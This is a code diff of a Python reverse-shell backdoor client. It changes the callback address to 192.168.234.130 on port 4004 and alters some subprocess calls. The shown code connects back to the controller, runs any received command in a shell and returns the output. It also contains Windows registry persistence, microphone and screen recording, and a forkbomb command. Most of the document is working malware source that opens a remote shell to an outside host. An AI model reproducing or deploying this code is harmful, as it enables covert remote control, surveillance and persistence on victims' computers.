@@ -14,7 +14,8 @@ import pyaudio
 import pyautogui
 import termcolor
 
-LHOST = "127.0.0.1";PORT = 4004
+
+LHOST = "192.168.234.130";PORT = 4004
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -84,7 +85,6 @@ def record(record_secs):
     wf.close()
 
 
-
 def persist(reg_name, copy_name):
     file_path = os.environ['appdata'] + '\\' + copy_name
     try:
@@ -111,11 +111,11 @@ def connection():
         except:
             connection()
 
+
 def shell():
     while True:
         cmd = reliable_recv()
         if cmd == 'exit':
-            reliable_send(termcolor.colored('[-] Goodbye', 'red'))
             break
         elif cmd == 'help':
             pass
@@ -153,10 +153,10 @@ def shell():
             os.remove('recorded.wav')
         elif cmd[:13] == 'screen_record':
             if cmd[14:] == 'on':
-                subprocess.call("python web.py", shell=True)
+                subprocess.Popen("python3 web.py", shell=True)
                 reliable_send(termcolor.colored('[+] Go to http://yourip/:5000', 'green'))
             if cmd[14:] == 'off':
-                check_call(["pkill", "-f", "web.py"])
+                subprocess.Popen("pkill -f web.py", shell=True)
                 reliable_send(termcolor.colored('[+] Done', 'green'))
         # elif cmd == 'record_cam':
         #     cam_record()
@@ -182,10 +182,12 @@ def shell():
             reliable_send(termcolor.colored("[+] Done sent forkbomb", 'green'))
 
         else:
-            execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
             reliable_send(result)
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
